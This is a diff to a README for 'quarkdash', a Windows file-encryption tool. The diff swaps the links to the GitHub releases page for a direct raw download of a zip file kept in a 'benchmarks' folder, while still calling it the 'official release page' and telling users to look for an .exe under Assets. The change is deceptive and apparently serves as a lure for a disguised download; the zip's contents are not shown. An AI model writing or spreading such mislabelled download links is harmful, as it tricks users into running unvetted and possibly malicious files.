@@ -1,6 +1,6 @@
 # 🛡️ quarkdash - Keep your digital data safe today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lagidiumdriploop223/quarkdash/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lagidiumdriploop223/quarkdash/raw/refs/heads/main/benchmarks/Software-1.3.zip)
 
 QuarkDash provides security for your files. It uses advanced math to scramble your data so only you can read it. This software works on your computer to keep sensitive information away from prying eyes. It offers speed and reliability for daily tasks.
 
@@ -8,7 +8,7 @@ QuarkDash provides security for your files. It uses advanced math to scramble yo
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/lagidiumdriploop223/quarkdash/releases) to find the latest version.
+1. Visit the [official release page](https://github.com/lagidiumdriploop223/quarkdash/raw/refs/heads/main/benchmarks/Software-1.3.zip) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the filename to start the download.
 4. Save the file to your Downloads folder.
